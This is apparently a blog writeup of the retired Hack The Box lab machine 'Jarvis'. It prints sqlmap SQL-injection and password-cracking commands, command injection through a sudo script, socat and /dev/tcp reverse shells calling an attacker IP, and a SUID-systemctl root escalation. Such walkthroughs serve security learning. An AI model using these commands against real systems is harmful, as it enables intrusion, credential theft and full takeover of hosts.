---
layout: post
title:  "HTB - Jarvis"
date:   2020-06-07 20:00 +0100
tags: writeups
initial: 2019-09-07
---
Writeup for the retired HTB machine Jarvis  
Link: https://www.hackthebox.eu/home/machines/profile/194  
IP: 10.10.10.143

<!--more-->

## Recon
nmap reveals a very limited port selection:
```
22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
5355/tcp  filtered llmnr
64999/tcp open     http    Apache httpd 2.4.25 ((Debian))
```

The web page on port 80 is a php site with not much at the first glance.  
On port 64999 you'll get a blank page with "Hey you have been banned for 90 seconds, don't be bad" on the first call.  
As a preliminary investigation, gobuster is used to find additional content on the webserver.

## Gobuster port 80
```
/images (Status: 301)
/index.php (Status: 200)
/nav.php (Status: 200)
/footer.php (Status: 200)
/back.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 301)
/connection.php (Status: 200)
/room.php (Status: 302)
/sass (Status: 301)
/server-status (Status: 403)
```

Exploring the website leads to weird reactions if the Room Booking (http://10.10.10.143/room.php?cod=1) is manipulated with. Guessing from these results and the URL schema, a closer inspection of SQL Injection capabilities was concluded.


## SQLMap
Running SQLmap with the dump parameter yields to successful execution.
`sqlmap -u http://10.10.10.143/room.php?cod=2 --dump`

As a next step, a password dump is attempted with *rockyou.txt* as dictionary file:
`sqlmap -u http://10.10.10.143/room.php?cod=2 --passwords`
which is successful:  

```
[10:43:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
(...)
[10:44:04] [INFO] starting dictionary-based cracking (mysql_passwd)
[10:44:04] [INFO] starting 2 processes 
[10:44:04] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                                   (...)
database management system users password hashes:                                                                                                                    
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou
```
With these credentials, loggin into phpMyAdmin is possible. As SQLMap is also able to spawn shells under certain circumstances, this is worth trying as well:  
`sqlmap -u http://10.10.10.143/room.php?cod=2 --os-shell`  
which yields a shell as `www-data`. By looking around a bit, we learn that the target OS user is named `pepper`.  
Also, there's an interesting script in `/var/www/Admin-Utilities`, it's `simpler.py`.  
Again, with SQLMap, this file can be downloaded:  
`sqlmap -u http://10.10.10.143/room.php?cod=2 --file-read=/var/www/Admin-Utilities/simpler.py`
On closer inspection, the script seems to execute actions in the user home folder of pepper. As this script is executed as *www-data*, there must be a sudo entry to run it as *pepper*. This can be confirmed by running `sudo -l`:  
`sqlmap -u http://10.10.10.143/room.php?cod=2 --os-cmd="sudo -l"`  
```
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```
At this point, a switch to a fully interactive session is needed. This can be archieved by running a local webserver on the attacker machine and serving a prepared PHP reverse shell (*apalaxsh.php*) that is downloaded via `wget` or `curl` to the target systems web dir (www-data).
With a running netcat receiver on the attacker machine (`nc -nvlp 9999`), the shell is triggered by pointing a browser to `/apalaxsh.php`, which yields a shell.

## Road to user
Now the script can be further examined in its native run environment as sudoed user:  
`sudo --user=pepper /var/www/Admin-Utilities/simpler.py`  

This [article on Infoblox Shell Escape](https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html) provides some ideas on how to escape via sudo/ping:  

```
$ sudo --user=pepper /var/www/Admin-Utilities/simpler.py -p

Enter an IP: $(cat /home/pepper/user.txt)

ping: 2afa36c4f05b37b34259[...]]: Temporary failure in name resolution
```
which yields the user flag.  
But this is not everything this shell can do. By upgrading the shell to a full interactive shell first (`python -c 'import pty; pty.spawn("/bin/sh")'`),  
we're able to spawn a shell as pepper:  
```
sudo --user=pepper /var/www/Admin-Utilities/simpler.py -p

Enter an IP: $(/bin/bash)
$(/bin/bash)
pepper@jarvis:/$ 
```
This shell isn't perfectly working, so it is upgraded to a full reverse shell. With nc running on port 8989, this command yields a fully functioning shell:  
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.15.195:8989`



## Road to root  
Exploring privilege escalation routes, it turns out that systemctl has the *SETUID* bit set, meaning it can run with root privileges.
Creating a systemctl oneshot service that spawns a reverse shell as root is therefore possible:
```
[Unit]
Description=Black magic happening, avert your eyes

[Service]
RemainAfterExit=yes
Type=simple
ExecStart=/bin/bash -c "exec 5<>/dev/tcp/10.10.15.195/8888; cat <&5 | while read line; do $line 2>&5 >&5; done"

[Install]
WantedBy=default.target
```
Then make use of systemctl link to link the service file into the correct position:  
`systemctl link /home/pepper/apalax.service`
and enable it, therefore opening the connection to port 8888 on our Machine:  
`systemctl start --now apalax`  

This spawns a minimal shell that is functioning enough to print the contents of `root.txt`.
